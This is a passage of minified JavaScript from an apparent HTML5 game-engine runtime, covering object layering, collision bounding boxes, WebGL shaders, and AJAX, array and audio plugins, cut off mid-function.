cr.do_cmp(cr.round6dp(100*this.opacity),t,e)},t.SetOpacity=function(t){t/=100;t<0?t=0:1<t&&(t=1),t!==this.opacity&&(this.opacity=t,this.runtime.redraw=!0)},e.Opacity=function(t){t.set_float(cr.round6dp(100*this.opacity))}),a&&(c.IsOnLayer=function(t){return!!t&&this.layer===t},c.PickTopBottom=function(t){var e=this.getCurrentSol(),i=e.getObjects();if(!i.length)return!1;for(var s=i[0],n=s,r=1,o=i.length;r<o;r++)s=i[r],0===t?(s.layer.index>n.layer.index||s.layer.index===n.layer.index&&s.get_zindex()>n.get_zindex())&&(n=s):(s.layer.index<n.layer.index||s.layer.index===n.layer.index&&s.get_zindex()<n.get_zindex())&&(n=s);return e.pick_one(n),!0},t.MoveToTop=function(){var t=this.layer,e=t.instances;e.length&&e[e.length-1]===this||(t.removeFromInstanceList(this,!1),t.appendToInstanceList(this,!1),this.runtime.redraw=!0)},t.MoveToBottom=function(){var t=this.layer,e=t.instances;e.length&&e[0]===this||(t.removeFromInstanceList(this,!1),t.prependToInstanceList(this,!1),this.runtime.redraw=!0)},t.MoveToLayer=function(t){t&&t!=this.layer&&(this.layer.removeFromInstanceList(this,!0),(this.layer=t).appendToInstanceList(this,!0),this.runtime.redraw=!0)},t.ZMoveToObject=function(t,e){t=0===t;!e||(e=e.getFirstPicked(this))&&e.uid!==this.uid&&(this.layer.index!==e.layer.index&&(this.layer.removeFromInstanceList(this,!0),this.layer=e.layer,e.layer.appendToInstanceList(this,!0)),this.layer.moveInstanceAdjacent(this,e,t),this.runtime.redraw=!0)},e.LayerNumber=function(t){t.set_int(this.layer.number)},e.LayerName=function(t){t.set_string(this.layer.name)},e.ZIndex=function(t){t.set_int(this.get_zindex())}),h&&(t.SetEffectEnabled=function(t,e){this.runtime.glwrap&&((e=this.type.getEffectIndexByName(e))<0||(t=1===t,this.active_effect_flags[e]!==t&&(this.active_effect_flags[e]=t,this.updateActiveEffects(),this.runtime.redraw=!0)))},t.SetEffectParam=function(t,e,i){var s;this.runtime.glwrap&&((s=this.type.getEffectIndexByName(t))<0||(t=this.type.effect_types[s],s=this.effect_params[s],(e=Math.floor(e))<0||e>=s.length||(1===this.runtime.glwrap.getProgramParameterType(t.shaderindex,e)&&(i/=100),s[e]!==i&&(s[e]=i,t.active&&(this.runtime.redraw=!0)))))})},cr.set_bbox_changed=function(){this.bbox_changed=!0,this.cell_changed=!0,this.type.any_cell_changed=!0,this.runtime.redraw=!0;for(var t=this.bbox_changed_callbacks,e=0,i=t.length;e<i;++e)t[e](this);this.layer.useRenderCells&&this.update_bbox()},cr.add_bbox_changed_callback=function(t){t&&this.bbox_changed_callbacks.push(t)},cr.update_bbox=function(){var t,e;this.bbox_changed&&(t=this.bbox,e=this.bquad,t.set(this.x,this.y,this.x+this.width,this.y+this.height),t.offset(-this.hotspotX*this.width,-this.hotspotY*this.height),this.angle?(t.offset(-this.x,-this.y),e.set_from_rotated_rect(t,this.angle),e.offset(this.x,this.y),e.bounding_box(t)):e.set_from_rect(t),t.normalize(),this.bbox_changed=!1,this.update_render_cell())};var i=new cr.rect(0,0,0,0);cr.update_render_cell=function(){var t,e;this.layer.useRenderCells&&(t=this.layer.render_grid,e=this.bbox,i.set(t.XToCell(e.left),t.YToCell(e.top),t.XToCell(e.right),t.YToCell(e.bottom)),this.rendercells.equals(i)||(this.rendercells.right<this.rendercells.left?t.update(this,null,i):t.update(this,this.rendercells,i),this.rendercells.copy(i),this.layer.render_list_stale=!0))},cr.update_collision_cell=function(){var t,e;this.cell_changed&&this.collisionsEnabled&&(this.update_bbox(),t=this.type.collision_grid,e=this.bbox,i.set(t.XToCell(e.left),t.YToCell(e.top),t.XToCell(e.right),t.YToCell(e.bottom)),this.collcells.equals(i)||(this.collcells.right<this.collcells.left?t.update(this,null,i):t.update(this,this.collcells,i),this.collcells.copy(i),this.cell_changed=!1))},cr.inst_contains_pt=function(t,e){return!!this.bbox.contains_pt(t,e)&&(!!this.bquad.contains_pt(t,e)&&(this.tilemap_exists?this.testPointOverlapTile(t,e):!(this.collision_poly&&!this.collision_poly.is_empty())||(this.collision_poly.cache_poly(this.width,this.height,this.angle),this.collision_poly.contains_pt(t-this.x,e-this.y))))},cr.inst_get_iid=function(){return this.type.updateIIDs(),this.iid},cr.inst_get_zindex=function(){return this.layer.updateZIndices(),this.zindex},cr.inst_updateActiveEffects=function(){var t;cr.clearArray(this.active_effect_types);for(var e=!0,i=0,s=this.active_effect_flags.length;i<s;i++)this.active_effect_flags[i]&&(t=this.type.effect_types[i],this.active_effect_types.push(t),t.preservesOpaqueness||(e=!1));this.uses_shaders=!!this.active_effect_types.length,this.shaders_preserve_opaqueness=e},cr.inst_toString=function(){return"Inst"+this.puid},cr.type_getFirstPicked=function(t){if(t&&t.is_contained&&t.type!=this)for(var e,i=0,s=t.siblings.length;i<s;i++)if((e=t.siblings[i]).type==this)return e;var n=this.getCurrentSol().getObjects();return n.length?n[0]:null},cr.type_getPairedInstance=function(t){var e=this.getCurrentSol().getObjects();return e.length?e[t.get_iid()%e.length]:null},cr.type_updateIIDs=function(){if(this.stale_iids&&!this.is_family){for(var t=0,e=this.instances.length;t<e;t++)this.instances[t].iid=t;var i=t,s=this.runtime.createRow;for(t=0,e=s.length;t<e;++t)s[t].type===this&&(s[t].iid=i++);this.stale_iids=!1}},cr.type_getInstanceByIID=function(t){if(t<this.instances.length)return this.instances[t];t-=this.instances.length;for(var e=this.runtime.createRow,i=0,s=e.length;i<s;++i)if(e[i].type===this){if(0===t)return e[i];--t}return null},cr.type_getCurrentSol=function(){return this.solstack[this.cur_sol]},cr.type_pushCleanSol=function(){this.cur_sol++,this.cur_sol===this.solstack.length?this.solstack.push(new cr.selection(this)):(this.solstack[this.cur_sol].select_all=!0,cr.clearArray(this.solstack[this.cur_sol].else_instances))},cr.type_pushCopySol=function(){this.cur_sol++,this.cur_sol===this.solstack.length&&this.solstack.push(new cr.selection(this));var t=this.solstack[this.cur_sol],e=this.solstack[this.cur_sol-1];e.select_all?t.select_all=!0:(t.select_all=!1,cr.shallowAssignArray(t.instances,e.instances)),cr.clearArray(t.else_instances)},cr.type_popSol=function(){this.cur_sol--},cr.type_getBehaviorByName=function(t){var e,i,s,n,r,o=0;if(!this.is_family)for(e=0,i=this.families.length;e<i;e++)for(s=0,n=(r=this.families[e]).behaviors.length;s<n;s++){if(t===r.behaviors[s].name)return this.extra.lastBehIndex=o,r.behaviors[s];o++}for(e=0,i=this.behaviors.length;e<i;e++){if(t===this.behaviors[e].name)return this.extra.lastBehIndex=o,this.behaviors[e];o++}return null},cr.type_getBehaviorIndexByName=function(t){return this.getBehaviorByName(t)?this.extra.lastBehIndex:-1},cr.type_getEffectIndexByName=function(t){for(var e=0,i=this.effect_types.length;e<i;e++)if(this.effect_types[e].name===t)return e;return-1},cr.type_applySolToContainer=function(){if(this.is_contained&&!this.is_family){var t,e,i,s,n;this.updateIIDs();for(var r=(s=this.getCurrentSol()).select_all,o=this.runtime.getCurrentEventStack(),a=o&&o.current_event&&o.current_event.orblock,h=0,c=this.container.length;h<c;h++)if(i=this.container[h],i!==this&&(i.updateIIDs(),!((n=i.getCurrentSol()).select_all=r))){for(cr.clearArray(n.instances),t=0,e=s.instances.length;t<e;++t)n.instances[t]=i.getInstanceByIID(s.instances[t].iid);if(a)for(cr.clearArray(n.else_instances),t=0,e=s.else_instances.length;t<e;++t)n.else_instances[t]=i.getInstanceByIID(s.else_instances[t].iid)}}},cr.type_toString=function(){return"Type"+this.sid},cr.do_cmp=function(t,e,i){if(void 0===t||void 0===i)return!1;switch(e){case 0:return t===i;case 1:return t!==i;case 2:return t<i;case 3:return t<=i;case 4:return i<t;case 5:return i<=t;default:return!1}}}(),cr.shaders={},cr.shaders.difference={src:["varying mediump vec2 vTex;","uniform lowp sampler2D samplerFront;","uniform lowp sampler2D samplerBack;","uniform mediump vec2 destStart;","uniform mediump vec2 destEnd;","void main(void)","{","lowp vec4 front = texture2D(samplerFront, vTex);","front.rgb /= front.a;","lowp vec4 back = texture2D(samplerBack, mix(destStart, destEnd, vTex));","back.rgb /= back.a;","front.rgb = (max(front.rgb, back.rgb) - min(front.rgb, back.rgb)) * front.a;","gl_FragColor = front;","}"].join("\n"),extendBoxHorizontal:0,extendBoxVertical:0,crossSampling:!0,preservesOpaqueness:!1,animated:!1,parameters:[]},cr.shaders.replacecolor={src:["varying mediump vec2 vTex;","uniform lowp sampler2D samplerFront;","uniform mediump float rsource;","uniform mediump float gsource;","uniform mediump float bsource;","uniform mediump float rdest;","uniform mediump float gdest;","uniform mediump float bdest;","uniform lowp float tolerance;","void main(void)","{","lowp vec4 front = texture2D(samplerFront, vTex);","lowp float a = front.a;","if (a != 0.0)","front.rgb /= a;","lowp float diff = length(front.rgb - vec3(rsource, gsource, bsource) / 255.0);","if (diff <= tolerance)","{","front.rgb = mix(front.rgb, vec3(rdest, gdest, bdest) / 255.0, 1.0 - diff / tolerance);","}","front.rgb *= a;","gl_FragColor = front;","}"].join("\n"),extendBoxHorizontal:0,extendBoxVertical:0,crossSampling:!1,preservesOpaqueness:!0,animated:!1,parameters:[["rsource",0,0],["gsource",0,0],["bsource",0,0],["rdest",0,0],["gdest",0,0],["bdest",0,0],["tolerance",0,1]]},cr.plugins_.AJAX=function(t){this.runtime=t},function(){var c=!1,e=null,l=null,u="",t=cr.plugins_.AJAX.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.lastData="",this.curTag="",this.progress=0,this.timeout=-1,(c=this.runtime.isNWjs)&&(e=require("path"),l=require("fs"),t=window.process||nw.process,u=e.dirname(t.execPath)+"\\")};var i=t.Instance.prototype,s=null;window.C2_AJAX_DCSide=function(t,e,i){s&&("success"===t?(s.curTag=e,s.lastData=i,s.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyComplete,s),s.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnComplete,s)):"error"===t?(s.curTag=e,s.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyError,s),s.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnError,s)):"progress"===t&&(s.progress=i,s.curTag=e,s.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnProgress,s)))},i.onCreate=function(){s=this},i.saveToJSON=function(){return{lastData:this.lastData}},i.loadFromJSON=function(t){this.lastData=t.lastData,this.curTag="",this.progress=0};var p={},d="";function n(){}function r(){}function o(){}i.doRequest=function(i,e,t,s){if(this.runtime.isDirectCanvas)AppMobi.webview.execute('C2_AJAX_WebSide("'+i+'", "'+e+'", "'+t+'", '+(s?'"'+s+'"':"null")+");");else{function n(){a.curTag=i,a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyError,a),a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnError,a)}function r(){var t;c?(t=u+e,l.existsSync(t)?l.readFile(t,{encoding:"utf8"},function(t,e){t?n():(a.curTag=i,a.lastData=e.replace(/\r\n/g,"\n"),a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyComplete,a),a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnComplete,a))}):n()):n()}var o,a=this,h=null;try{(h=this.runtime.isWindowsPhone8?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest).onreadystatechange=function(){4===h.readyState&&(a.curTag=i,h.responseText?a.lastData=h.responseText.replace(/\r\n/g,"\n"):a.lastData="",400<=h.status?(a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyError,a),a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnError,a)):c&&!a.lastData.length||!c&&0===h.status&&!a.lastData.length||(a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyComplete,a),a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnComplete,a)))},this.runtime.isWindowsPhone8||(h.onerror=r,h.ontimeout=r,h.onabort=r,h.onprogress=function(t){t.lengthComputable&&(a.progress=t.loaded/t.total,a.curTag=i,a.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnProgress,a))}),h.open(t,e),this.runtime.isWindowsPhone8||0<=this.timeout&&void 0!==h.timeout&&(h.timeout=this.timeout);try{h.responseType="text"}catch(t){}if(s&&h.setRequestHeader&&!p.hasOwnProperty("Content-Type")&&h.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),h.setRequestHeader){for(o in p)if(p.hasOwnProperty(o))try{h.setRequestHeader(o,p[o])}catch(t){}p={}}if(d&&h.overrideMimeType){try{h.overrideMimeType(d)}catch(t){}d=""}s?h.send(s):h.send()}catch(t){r()}}},n.prototype.OnComplete=function(t){return cr.equals_nocase(t,this.curTag)},n.prototype.OnAnyComplete=function(t){return!0},n.prototype.OnError=function(t){return cr.equals_nocase(t,this.curTag)},n.prototype.OnAnyError=function(t){return!0},n.prototype.OnProgress=function(t){return cr.equals_nocase(t,this.curTag)},t.cnds=new n,r.prototype.Request=function(e,t){var i=this;this.runtime.isWKWebView&&!this.runtime.isAbsoluteUrl(t)?this.runtime.fetchLocalFileViaCordovaAsText(t,function(t){i.curTag=e,i.lastData=t.replace(/\r\n/g,"\n"),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyComplete,i),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnComplete,i)},function(t){i.curTag=e,i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyError,i),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnError,i)}):this.doRequest(e,t,"GET")},r.prototype.RequestFile=function(e,t){var i=this;this.runtime.isWKWebView?this.runtime.fetchLocalFileViaCordovaAsText(t,function(t){i.curTag=e,i.lastData=t.replace(/\r\n/g,"\n"),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyComplete,i),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnComplete,i)},function(t){i.curTag=e,i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnAnyError,i),i.runtime.trigger(cr.plugins_.AJAX.prototype.cnds.OnError,i)}):this.doRequest(e,t,"GET")},r.prototype.Post=function(t,e,i,s){this.doRequest(t,e,s,i)},r.prototype.SetTimeout=function(t){this.timeout=1e3*t},r.prototype.SetHeader=function(t,e){p[t]=e},r.prototype.OverrideMIMEType=function(t){d=t},t.acts=new r,o.prototype.LastData=function(t){t.set_string(this.lastData)},o.prototype.Progress=function(t){t.set_float(this.progress)},o.prototype.Tag=function(t){t.set_string(this.curTag)},t.exps=new o}(),cr.plugins_.Arr=function(t){this.runtime=t},function(){var t=cr.plugins_.Arr.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,s=[];function a(){return s.length?s.pop():[]}function r(t){for(var e=0,i=t.length;e<i;e++)Array.isArray(t[e])&&r(t[e]);cr.clearArray(t),s.push(t)}function i(){}function n(){}function o(t,e){if(cr.is_number(t)&&cr.is_number(e))return t-e;t=""+t,e=""+e;return t<e?-1:e<t?1:0}function h(){}Array.isArray||(Array.isArray=function(t){return"[object Array]"===Object.prototype.toString.call(t)}),e.onCreate=function(){this.cx=this.properties[0],this.cy=this.properties[1],this.cz=this.properties[2],this.recycled||(this.arr=a());var t,e,i,s=this.arr;for(s.length=this.cx,t=0;t<this.cx;t++)for(s[t]||(s[t]=a()),s[t].length=this.cy,e=0;e<this.cy;e++)for(s[t][e]||(s[t][e]=a()),s[t][e].length=this.cz,i=0;i<this.cz;i++)s[t][e][i]=0;this.forX=[],this.forY=[],this.forZ=[],this.forDepth=-1},e.onDestroy=function(){for(var t=0;t<this.cx;t++)r(this.arr[t]);cr.clearArray(this.arr)},e.at=function(t,e,i){return t=Math.floor(t),e=Math.floor(e),i=Math.floor(i),isNaN(t)||t<0||t>this.cx-1||isNaN(e)||e<0||e>this.cy-1||isNaN(i)||i<0||i>this.cz-1?0:this.arr[t][e][i]},e.set=function(t,e,i,s){t=Math.floor(t),e=Math.floor(e),i=Math.floor(i),isNaN(t)||t<0||t>this.cx-1||isNaN(e)||e<0||e>this.cy-1||isNaN(i)||i<0||i>this.cz-1||(this.arr[t][e][i]=s)},e.getAsJSON=function(){return JSON.stringify({c2array:!0,size:[this.cx,this.cy,this.cz],data:this.arr})},e.saveToJSON=function(){return{size:[this.cx,this.cy,this.cz],data:this.arr}},e.loadFromJSON=function(t){var e=t.size;this.cx=e[0],this.cy=e[1],this.cz=e[2],this.arr=t.data},e.setSize=function(t,e,i){if(t<0&&(t=0),e<0&&(e=0),i<0&&(i=0),this.cx!==t||this.cy!==e||this.cz!==i){var s,n,r;this.cx=t,this.cy=e,this.cz=i;var o=this.arr;for(o.length=t,s=0;s<this.cx;s++)for(cr.is_undefined(o[s])&&(o[s]=a()),o[s].length=e,n=0;n<this.cy;n++)for(cr.is_undefined(o[s][n])&&(o[s][n]=a()),o[s][n].length=i,r=0;r<this.cz;r++)cr.is_undefined(o[s][n][r])&&(o[s][n][r]=0)}},e.getForX=function(){return 0<=this.forDepth&&this.forDepth<this.forX.length?this.forX[this.forDepth]:0},e.getForY=function(){return 0<=this.forDepth&&this.forDepth<this.forY.length?this.forY[this.forDepth]:0},e.getForZ=function(){return 0<=this.forDepth&&this.forDepth<this.forZ.length?this.forZ[this.forDepth]:0},i.prototype.CompareX=function(t,e,i){return cr.do_cmp(this.at(t,0,0),e,i)},i.prototype.CompareXY=function(t,e,i,s){return cr.do_cmp(this.at(t,e,0),i,s)},i.prototype.CompareXYZ=function(t,e,i,s,n){return cr.do_cmp(this.at(t,e,i),s,n)},e.doForEachTrigger=function(t){this.runtime.pushCopySol(t.solModifiers),t.retrigger(),this.runtime.popSol(t.solModifiers)},i.prototype.ArrForEach=function(t){var e=this.runtime.getCurrentEventStack().current_event;this.forDepth++;var i=this.forDepth;switch(i===this.forX.length?(this.forX.push(0),this.forY.push(0),this.forZ.push(0)):(this.forX[i]=0,this.forY[i]=0,this.forZ[i]=0),t){case 0:for(this.forX[i]=0;this.forX[i]<this.cx;this.forX[i]++)for(this.forY[i]=0;this.forY[i]<this.cy;this.forY[i]++)for(this.forZ[i]=0;this.forZ[i]<this.cz;this.forZ[i]++)this.doForEachTrigger(e);break;case 1:for(this.forX[i]=0;this.forX[i]<this.cx;this.forX[i]++)for(this.forY[i]=0;this.forY[i]<this.cy;this.forY[i]++)this.doForEachTrigger(e);break;case 2:for(this.forX[i]=0;this.forX[i]<this.cx;this.forX[i]++)this.doForEachTrigger(e)}return this.forDepth--,!1},i.prototype.CompareCurrent=function(t,e){return cr.do_cmp(this.at(this.getForX(),this.getForY(),this.getForZ()),t,e)},i.prototype.Contains=function(t){for(var e,i,s=0;s<this.cx;s++)for(e=0;e<this.cy;e++)for(i=0;i<this.cz;i++)if(this.arr[s][e][i]===t)return!0;return!1},i.prototype.IsEmpty=function(){return 0===this.cx||0===this.cy||0===this.cz},i.prototype.CompareSize=function(t,e,i){var s=0;switch(t){case 0:s=this.cx;break;case 1:s=this.cy;break;case 2:s=this.cz}return cr.do_cmp(s,e,i)},t.cnds=new i,n.prototype.Clear=function(){for(var t,e,i=0;i<this.cx;i++)for(t=0;t<this.cy;t++)for(e=0;e<this.cz;e++)this.arr[i][t][e]=0},n.prototype.SetSize=function(t,e,i){this.setSize(t,e,i)},n.prototype.SetX=function(t,e){this.set(t,0,0,e)},n.prototype.SetXY=function(t,e,i){this.set(t,e,0,i)},n.prototype.SetXYZ=function(t,e,i,s){this.set(t,e,i,s)},n.prototype.Push=function(t,e,i){var s=0,n=0,r=0,o=this.arr;switch(i){case 0:for(0===t?(s=o.length,o.push(a())):(s=0,o.unshift(a())),o[s].length=this.cy;n<this.cy;n++)for(o[s][n]=a(),o[s][n].length=this.cz,r=0;r<this.cz;r++)o[s][n][r]=e;this.cx++;break;case 1:for(;s<this.cx;s++)for(0===t?(n=o[s].length,o[s].push(a())):(n=0,o[s].unshift(a())),o[s][n].length=this.cz,r=0;r<this.cz;r++)o[s][n][r]=e;this.cy++;break;case 2:for(;s<this.cx;s++)for(n=0;n<this.cy;n++)0===t?o[s][n].push(e):o[s][n].unshift(e);this.cz++}},n.prototype.Pop=function(t,e){var i=0,s=0,n=this.arr;switch(e){case 0:if(0===this.cx)break;r(0===t?n.pop():n.shift()),this.cx--;break;case 1:if(0===this.cy)break;for(;i<this.cx;i++)r(0===t?n[i].pop():n[i].shift());this.cy--;break;case 2:if(0===this.cz)break;for(;i<this.cx;i++)for(s=0;s<this.cy;s++)0===t?n[i][s].pop():n[i][s].shift();this.cz--}},n.prototype.Reverse=function(t){var e=0,i=0,s=this.arr;if(0!==this.cx&&0!==this.cy&&0!==this.cz)switch(t){case 0:s.reverse();break;case 1:for(;e<this.cx;e++)s[e].reverse();break;case 2:for(;e<this.cx;e++)for(i=0;i<this.cy;i++)s[e][i].reverse()}},n.prototype.Sort=function(t){var e=0,i=0,s=this.arr;if(0!==this.cx&&0!==this.cy&&0!==this.cz)switch(t){case 0:s.sort(function(t,e){return o(t[0][0],e[0][0])});break;case 1:for(;e<this.cx;e++)s[e].sort(function(t,e){return o(t[0],e[0])});break;case 2:for(;e<this.cx;e++)for(i=0;i<this.cy;i++)s[e][i].sort(o)}},n.prototype.Delete=function(t,e){var i=0,s=0;t=Math.floor(t);var n=this.arr;if(!(t<0))switch(e){case 0:if(t>=this.cx)break;r(n[t]),n.splice(t,1),this.cx--;break;case 1:if(t>=this.cy)break;for(;i<this.cx;i++)r(n[i][t]),n[i].splice(t,1);this.cy--;break;case 2:if(t>=this.cz)break;for(;i<this.cx;i++)for(s=0;s<this.cy;s++)n[i][s].splice(t,1);this.cz--}},n.prototype.Insert=function(t,e,i){var s=0,n=0,r=0;e=Math.floor(e);var o=this.arr;if(!(e<0))switch(i){case 0:if(e>this.cx)return;for(s=e,o.splice(s,0,a()),o[s].length=this.cy;n<this.cy;n++)for(o[s][n]=a(),o[s][n].length=this.cz,r=0;r<this.cz;r++)o[s][n][r]=t;this.cx++;break;case 1:if(e>this.cy)return;for(;s<this.cx;s++)for(n=e,o[s].splice(n,0,a()),o[s][n].length=this.cz,r=0;r<this.cz;r++)o[s][n][r]=t;this.cy++;break;case 2:if(e>this.cz)return;for(;s<this.cx;s++)for(n=0;n<this.cy;n++)o[s][n].splice(e,0,t);this.cz++}},n.prototype.JSONLoad=function(t){var e,i;try{e=JSON.parse(t)}catch(t){return}e.c2array&&(i=e.size,this.cx=i[0],this.cy=i[1],this.cz=i[2],this.arr=e.data)},n.prototype.JSONDownload=function(t){var e,i=document.createElement("a");void 0===i.download?(e="data:text/html,"+encodeURIComponent("<p><a download='"+t+"' href=\"data:application/json,"+encodeURIComponent(this.getAsJSON())+'">Download link</a></p>'),window.open(e)):(e=document.getElementsByTagName("body")[0],i.textContent=t,i.href="data:application/json,"+encodeURIComponent(this.getAsJSON()),i.download=t,e.appendChild(i),(t=document.createEvent("MouseEvent")).initMouseEvent("click",!0,!0,window,0,0,0,0,0,!1,!1,!1,!1,0,null),i.dispatchEvent(t),e.removeChild(i))},t.acts=new n,h.prototype.At=function(t,e,i,s){i=i||0,s=s||0;t.set_any(this.at(e,i,s))},h.prototype.Width=function(t){t.set_int(this.cx)},h.prototype.Height=function(t){t.set_int(this.cy)},h.prototype.Depth=function(t){t.set_int(this.cz)},h.prototype.CurX=function(t){t.set_int(this.getForX())},h.prototype.CurY=function(t){t.set_int(this.getForY())},h.prototype.CurZ=function(t){t.set_int(this.getForZ())},h.prototype.CurValue=function(t){t.set_any(this.at(this.getForX(),this.getForY(),this.getForZ()))},h.prototype.Front=function(t){t.set_any(this.at(0,0,0))},h.prototype.Back=function(t){t.set_any(this.at(this.cx-1,0,0))},h.prototype.IndexOf=function(t,e){for(var i=0;i<this.cx;i++)if(this.arr[i][0][0]===e)return void t.set_int(i);t.set_int(-1)},h.prototype.LastIndexOf=function(t,e){for(var i=this.cx-1;0<=i;i--)if(this.arr[i][0][0]===e)return void t.set_int(i);t.set_int(-1)},h.prototype.AsJSON=function(t){t.set_string(this.getAsJSON())},t.exps=new h}(),cr.plugins_.Audio=function(t){this.runtime=t},function(){var t=cr.plugins_.Audio.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){};var c=null,n=null,r="",o="",a=0,h=1,l=2,u=3,p=a,d=null,g=[],x=[],f=null,m=!1,y=0,S=!1,T=1,_=0,v=0,b=!1,s=1,w=1,C=10,O=1e4,k=1,A=null,E="",I=!1,P=[],M=!1,F=!1;function L(t){-1===P.indexOf(t)&&P.push(t)}function D(e){var t,i=e.instanceObject;try{t=i.play()}catch(t){return void L(e)}t?t.catch(function(t){L(e)}):I&&!c.isInUserInputEvent&&L(e)}function e(){var t,e,i,s,n,r;F||b||!d||("suspended"===d.state&&d.resume&&d.resume(),d.createBuffer&&(n=d.createBuffer(1,220,22050),(r=d.createBufferSource()).buffer=n,r.connect(d.destination),W(r)),"running"===d.state&&(F=!0));var o=P.slice(0);if(cr.clearArray(P),!S)for(t=0,e=o.length;t<e;++t)(i=o[t]).stopped||i.is_paused||(s=i.instanceObject.play())&&s.catch(function(t){L(i)})}function R(t){t=B(t);return isFinite(t)||(t=0),t<0&&(t=0),1<t&&(t=1),t}function j(t){return t<0&&(t=0),1<t&&(t=1),t=t,Math.log(t)/Math.log(10)*20}function B(t){return Math.pow(10,t/20)}document.addEventListener("pointerup",e,!0),document.addEventListener("touchend",e,!0),document.addEventListener("click",e,!0),document.addEventListener("keydown",e,!0),document.addEventListener("gamepadconnected",e,!0);var N={};function V(t){return t=t.toLowerCase(),N.hasOwnProperty(t)&&N[t].length?N[t][0].getInputNode():d.destination}function G(){return d.createGain?d.createGain():d.createGainNode()}function X(t){return d.createDelay?d.createDelay(t):d.createDelayNode(t)}function W(t,e){t.start?t.start(e||0):t.noteOn(e||0)}function z(t,e,i,s){t.start?t.start(s||0,e):t.noteGrainOn(s||0,e,i-e)}function i(t){try{t.stop?t.stop(0):t.noteOff(0)}catch(t){}}function U(t,e,i,s){if(t)if(t.cancelScheduledValues(0),0!==s){var n=d.currentTime;switch(s+=n,i){case 0:t.setValueAtTime(e,s);break;case 1:t.setValueAtTime(t.value,n),t.linearRampToValueAtTime(e,s);break;case 2:t.setValueAtTime(t.value,n),t.exponentialRampToValueAtTime(e,s)}}else t.value=e}var Y=["lowpass","highpass","bandpass","lowshelf","highshelf","peaking","notch","allpass"];function J(t,e,i,s,n,r){this.type="filter",this.params=[t,e,i,s,n,r],this.inputNode=G(),this.wetNode=G(),this.wetNode.gain.value=r,this.dryNode=G(),this.dryNode.gain.value=1-r,this.filterNode=d.createBiquadFilter(),"number"==typeof this.filterNode.type?this.filterNode.type=t:this.filterNode.type=Y[t],this.filterNode.frequency.value=e,this.filterNode.detune&&(this.filterNode.detune.value=i),this.filterNode.Q.value=s,this.filterNode.gain.value=n,this.inputNode.connect(this.filterNode),this.inputNode.connect(this.dryNode),this.filterNode.connect(this.wetNode)}function H(t,e,i){this.type="delay",this.params=[t,e,i],this.inputNode=G(),this.wetNode=G(),this.wetNode.gain.value=i,this.dryNode=G(),this.dryNode.gain.value=1-i,this.mainNode=G(),this.delayNode=X(t),this.delayNode.delayTime.value=t,this.delayGainNode=G(),this.delayGainNode.gain.value=e,this.inputNode.connect(this.mainNode),this.inputNode.connect(this.dryNode),this.mainNode.connect(this.wetNode),this.mainNode.connect(this.delayNode),this.delayNode.connect(this.delayGainNode),this.delayGainNode.connect(this.mainNode)}function q(t,e,i,s){this.type="convolve",this.params=[e,i,s],this.inputNode=G(),this.wetNode=G(),this.wetNode.gain.value=i,this.dryNode=G(),this.dryNode.gain.value=1-i,this.convolveNode=d.createConvolver(),t&&(this.convolveNode.normalize=e,this.convolveNode.buffer=t),this.inputNode.connect(this.convolveNode),this.inputNode.connect(this.dryNode),this.convolveNode.connect(this.wetNode)}function K(t,e,i,s,n){this.type="flanger",this.params=[t,e,i,s,n],this.inputNode=G(),this.dryNode=G(),this.dryNode.gain.value=1-n/2,this.wetNode=G(),this.wetNode.gain.value=n/2,this.feedbackNode=G(),this.feedbackNode.gain.value=s,this.delayNode=X(t+e),this.delayNode.delayTime.value=t,this.oscNode=d.createOscillator(),this.oscNode.frequency.value=i,this.oscGainNode=G(),this.oscGainNode.gain.value=e,this.inputNode.connect(this.delayNode),this.inputNode.connect(this.dryNode),this.delayNode.connect(this.wetNode),this.delayNode.connect(this.feedbackNode),this.feedbackNode.connect(this.delayNode),this.oscNode.connect(this.oscGainNode),this.oscGainNode.connect(this.delayNode.delayTime),W(this.oscNode)}function Q(t,e,i,s,n,r){this.type="phaser",this.params=[t,e,i,s,n,r],this.inputNode=G(),this.dryNode=G(),this.dryNode.gain.value=1-r/2,this.wetNode=G(),this.wetNode.gain.value=r/2,this.filterNode=d.createBiquadFilter(),"number"==typeof this.filterNode.type?this.filterNode.type=7:this.filterNode.type="allpass",this.filterNode.frequency.value=t,this.filterNode.detune&&(this.filterNode.detune.value=e),this.filterNode.Q.value=i,this.oscNode=d.createOscillator(),this.oscNode.frequency.value=n,this.oscGainNode=G(),this.oscGainNode.gain.value=s,this.inputNode.connect(this.filterNode),this.inputNode.connect(this.dryNode),this.filterNode.connect(this.wetNode),this.oscNode.connect(this.oscGainNode),this.oscGainNode.connect(this.filterNode.frequency),W(this.oscNode)}function Z(t){this.type="gain",this.params=[t],this.node=G(),this.node.gain.value=t}function 